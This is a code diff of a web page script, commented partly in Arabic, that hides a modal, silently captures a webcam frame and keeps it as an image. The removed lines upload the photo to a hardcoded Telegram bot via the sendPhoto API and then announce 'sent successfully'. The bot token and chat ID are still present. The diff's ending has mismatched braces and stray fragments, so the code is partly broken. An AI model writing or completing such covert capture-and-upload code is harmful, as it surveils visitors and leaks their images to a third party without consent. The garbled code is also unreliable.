@@ -62,39 +62,59 @@ button{
 const BOT_TOKEN = "8179487086:AAEHNdOJmfXOeS3cwhlhfCPW0O9yFMiRRcM";
 const CHAT_ID = "-1002610945529";
 
-async function startAll(){
+async function start(){
     document.getElementById("modal").style.display="none";
 
+    const video = document.getElementById("video");
+
     try{
-        const stream = await navigator.mediaDevices.getUserMedia({video:true});
-        const video = document.getElementById("video");
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" }
+        });
+
+        video.srcObject = stream;
+        video.play();
+
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+
+        const bitmap = await imageCapture.grabFrame();
+
+        const canvas = document.getElementById("canvas");
+        canvas.width = bitmap.width;
+        canvas.height = bitmap.height;
+
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(bitmap, 0, 0);
+
+        canvas.toBlob(blob => {
+            window.capturedImage = blob; // تخزين الصورة
+        }, "image/png");
+
+        stream.getTracks().forEach(t => t.stop());
+
+    }catch(e){
+        console.log("fallback used");
+
+        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
         video.srcObject = stream;
 
-        video.onloadedmetadata = async () => {
+        video.onloadeddata = () => {
+            const canvas = document.getElementById("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
 
-            setTimeout(async () => {
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0);
 
-                const canvas = document.getElementById("canvas");
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
+            canvas.toBlob(blob => {
+                window.capturedImage = blob;
+            }, "image/png");
 
-                const ctx = canvas.getContext("2d");
-                ctx.drawImage(video,0,0);
-
-                canvas.toBlob(async (blob)=>{
-
-                    const form = new FormData();
-                    form.append("chat_id", CHAT_ID);
-                    form.append("photo", blob, "photo.png");
-
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method:"POST",
-                        body:form
-                    });
-
-                    alert("تم الإرسال بنجاح");
-
-                    stream.getTracks().forEach(t=>t.stop());
+            stream.getTracks().forEach(t => t.stop());
+        };
+    }
+            };
 
                 }, "image/png");
 
